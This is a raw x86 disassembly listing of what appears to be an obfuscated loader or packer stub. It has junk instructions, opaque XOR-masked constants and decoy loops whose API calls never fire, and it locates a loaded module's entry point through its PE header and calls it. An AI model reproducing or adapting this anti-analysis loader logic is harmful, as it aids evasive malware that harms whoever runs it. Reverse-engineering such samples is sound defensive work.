  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423b11
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d4a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d46,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c36
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x4239e2
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c36
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e52
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c36
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x4238af
  41bc20:	push   0x4238e3
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e52,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c36
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x42392e
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x4238e3
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x4239a6
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c36
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aba,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d0e,eax
  41c15b:	mov    eax,ds:0x421aba
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c36
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d0e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aba
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c36
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c36
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c36
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cba,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421cb2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c36
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
